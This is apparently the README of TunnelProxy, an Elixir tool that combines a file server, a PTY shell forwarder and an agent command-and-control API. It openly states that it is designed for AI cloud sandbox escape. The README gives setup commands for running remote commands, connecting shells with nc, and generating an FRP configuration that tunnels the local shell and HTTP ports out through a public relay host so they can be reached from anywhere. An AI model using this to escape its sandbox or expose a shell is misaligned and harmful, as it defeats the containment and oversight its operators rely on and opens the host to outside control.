---
TunnelProxy

HTTP Server + PTY Shell Forwarder + Agent C2 Framework

A lightweight all-in-one tool for file serving, remote shell, file upload, and persistent agent-controlled PTY sessions. Designed for AI cloud sandbox escape via FRP intranet penetration.

Features

Feature Description
Static File Server Browse and download files with directory listing
PTY Shell Forwarder Persistent shell per agent + one-time temporary shell sessions
File Upload Upload via web page or curl command
Agent Management Register, heartbeat, remote command execution with token auth
One-Time PTY Session Dynamic random port, token-authenticated, 10s auto-destroy
Registration Lock Prevent new agent registration in production
Preset Agents Auto-register agents from environment variables on startup
---
Installation

Option 1: Install from Hex

```elixir
def deps do
  [
    {:tunnel_proxy, "~> 0.3.3"}
  ]
end
```

Option 2: Build from Source

```bash
git clone https://github.com/TurinFohlen/tunnel_proxy.git
cd tunnel_proxy
mix deps.get
mix compile
```

Quick Start

Start the Server

```bash
export TUNNEL_DOC_ROOT="./www"
export TUNNEL_UPLOAD_DIR="./uploads"
export TUNNEL_PRESET_AGENT_1="agent1:myhost:root:linux"
mkdir -p "$TUNNEL_DOC_ROOT" "$TUNNEL_UPLOAD_DIR"
iex -S mix
```

Expected output:

```
[AgentManager] Preset agent registered: agent1
[AgentManager] Token: xxxxxxxxx
HTTP Server: 0.0.0.0:8080
```

Connect to Persistent Shell (nc)

```bash
# First request a one-time PTY session with your agent token
curl -X POST http://127.0.0.1:8080/api/session \
  -H "Content-Type: application/json" \
  -d '{"token":"你的token"}'
# Returns {"ok":true,"port":45231}

# Then connect within 10 seconds
nc 127.0.0.1 45231
```

Type commands and get output:

```bash
$ pwd
/path/to/current
$ ls -la
...file list...
$ exit
```

Execute Commands via HTTP API

```bash
# Execute a command
curl -X POST http://127.0.0.1:8080/api/exec \
  -H "Content-Type: application/json" \
  -d '{"agent_id":"agent1","token":"你的token","cmd":"whoami"}'
# Returns {"ok":true,"task_id":"agent1_1"}

# Get result
curl http://127.0.0.1:8080/api/result/agent1_1
# Returns {"output":"root","status":"complete"}
```

Access Files

```bash
curl http://127.0.0.1:8080/
```

Open in browser: http://127.0.0.1:8080/

Upload Files

Via curl:

```bash
curl -X POST http://127.0.0.1:8080/upload --data-binary @file.txt
```

Via browser:
Visit http://127.0.0.1:8080/upload, select file, click upload.

Agent API Reference

Method Path Description
POST /api/register Register a new agent
POST /api/heartbeat Agent heartbeat keep-alive
POST /api/exec Submit a command for execution
GET /api/result/:task_id Poll command execution result
GET /api/agents List all online agents
POST /api/session Request a one-time PTY session port

Configuration

Create config/config.exs or set environment variables:

```elixir
config :tunnel_proxy,
  http_port: 8080,
  doc_root: "./www",
  upload_dir: "./uploads"
```

Environment variables:

Variable Default Description
TUNNEL_PRESET_AGENT_1 - Preset agent 1 (id:hostname:username:os)
TUNNEL_PRESET_AGENT_2 - Preset agent 2 (optional)
TUNNEL_LOCK_REGISTRATION - Set to 1 to prevent new agent registration
SHELL /bin/sh Shell to use for PTY sessions
UPLOAD_MAGIC MY_MAGIC_2025_FILE_HEAD Magic word for upload validation
TUNNEL_DOC_ROOT ./www Static files directory
TUNNEL_UPLOAD_DIR ./uploads Upload destination

Use Cases

Standalone

```bash
cd ~/tunnel_proxy
export TUNNEL_PRESET_AGENT_1="main:localhost:root:linux"
iex -S mix
```

With frp (Intranet Penetration)

Create a setup script that generates a secure, unique FRP configuration:

```bash
cat > setup-frp.sh << 'SETUP_EOF'
#!/bin/bash
FRPC_CONFIG="frpc.toml"
PROXY_NAME="tunnel-$(openssl rand -hex 32)"
HTTP_PORT=$((10001 + RANDOM % 40000))
SHELL_PORT=$((10001 + RANDOM % 40000))
while [ $SHELL_PORT -eq $HTTP_PORT ]; do
    SHELL_PORT=$((10001 + RANDOM % 40000))
done

cat > "$FRPC_CONFIG" << FRPC_EOF
serverAddr = "frp.freefrp.net"
serverPort = 7000
auth.token = "freefrp.net"

[[proxies]]
name = "$PROXY_NAME-http"
type = "tcp"
localIP = "127.0.0.1"
localPort = ${TUNNEL_HTTP_PORT:-8080}
remotePort = $HTTP_PORT

[[proxies]]
name = "$PROXY_NAME-shell"
type = "tcp"
localIP = "127.0.0.1"
localPort = ${TUNNEL_PTY_PORT:-27417}
remotePort = $SHELL_PORT
FRPC_EOF

echo "✅ Generated $FRPC_CONFIG"
echo "📋 Connection info:"
echo "   HTTP:  frp.freefrp.net:$HTTP_PORT"
echo "   Shell: frp.freefrp.net:$SHELL_PORT"
SETUP_EOF

chmod 755 setup-frp.sh
./setup-frp.sh
```

After running, connect using the ports shown in the output,
then access from anywhere:

```bash
nc frp.freefrp.net <YOUR_SHELL_PORT>
curl http://frp.freefrp.net:<YOUR_HTTP_PORT>/
```

Requirements

· Elixir 1.12+
· Erlang/OTP 24+

License

MIT License - see LICENSE file for details.

Author

TurinFohlen - GitHub

Contributing

Issues and pull requests are welcome.

